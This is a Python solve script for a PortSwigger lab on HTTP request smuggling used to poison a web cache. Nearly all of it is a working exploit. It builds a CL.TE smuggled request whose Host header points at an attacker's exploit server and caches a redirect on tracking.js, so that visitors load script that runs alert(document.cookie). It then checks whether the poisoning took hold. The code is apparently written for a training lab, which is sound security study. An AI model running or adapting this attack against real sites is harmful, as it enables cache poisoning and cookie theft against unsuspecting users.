#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Exploiting HTTP request smuggling to perform web cache poisoning.

Smuggle a GET /post/next?postId=3 with Host: exploit-server, then immediately
request /resources/js/tracking.js. The front-end caches the smuggled 302
response under the tracking.js URL. Every subsequent visitor following that
cached redirect loads /post from the exploit server (serves alert(document.cookie)).

Raw TLS sockets throughout.
"""

import argparse
import socket
import ssl
import time
from urllib.parse import urlparse


def poisoning_request(lab_host: str, exploit_host: str) -> bytes:
    smuggled = (
        f"GET /post/next?postId=3 HTTP/1.1\r\n"
        f"Host: {exploit_host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 10\r\n"
        f"\r\n"
        f"x=1"
    )
    body = "0\r\n\r\n" + smuggled
    cl = len(body.encode())
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {lab_host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    ).encode()


def trigger_request(lab_host: str) -> bytes:
    return (
        f"GET /resources/js/tracking.js HTTP/1.1\r\n"
        f"Host: {lab_host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()


def send_pair(host: str, port: int, poison: bytes, trigger: bytes) -> list[bytes]:
    """Send poisoning + trigger back-to-back on one TLS connection."""
    ctx = ssl.create_default_context()
    responses = []
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            for payload in (poison, trigger):
                ssock.sendall(payload)
                data = b""
                try:
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if len(data) > 2000:
                            break
                except socket.timeout:
                    pass
                responses.append(data)
    return responses


def check_poisoned(host: str, port: int, lab_host: str) -> bool:
    """Send one tracking.js request and check for a 302 to the exploit server."""
    ctx = ssl.create_default_context()
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            ssock.sendall(trigger_request(lab_host))
            data = b""
            try:
                while True:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if b"\r\n\r\n" in data and len(data) > 100:
                        break
            except socket.timeout:
                pass
            return b" 302 " in data[:20] or b"Location" in data


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP Request Smuggling Lab 11 (web cache poisoning)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("exploit_url", help="Exploit server URL (where /post serves JS)")
    parser.add_argument("--attempts", type=int, default=5, help="How many poison attempts")
    args = parser.parse_args()

    lab = urlparse(args.lab_url)
    lab_host = lab.hostname
    port = lab.port or 443
    exploit_host = urlparse(args.exploit_url).hostname

    poison = poisoning_request(lab_host, exploit_host)
    trigger = trigger_request(lab_host)

    for i in range(1, args.attempts + 1):
        print(f"\n[*] Attempt {i}/{args.attempts}: sending poison + trigger")
        responses = send_pair(lab_host, port, poison, trigger)
        for j, r in enumerate(responses, 1):
            status = r.split(b"\r\n", 1)[0].decode(errors="replace") if r else "<empty>"
            print(f"    Response {j}: {status}")

        time.sleep(2)
        if check_poisoned(lab_host, port, lab_host):
            print(f"\n[+] Cache poisoned! tracking.js now returns 302 to {exploit_host}")
            print("[*] Wait for admin to load any page — alert(document.cookie) fires on their browser.")
            return

    print("\n[-] Poisoning didn't land. Try more attempts or verify exploit server /post is set up correctly.")


if __name__ == "__main__":
    main()
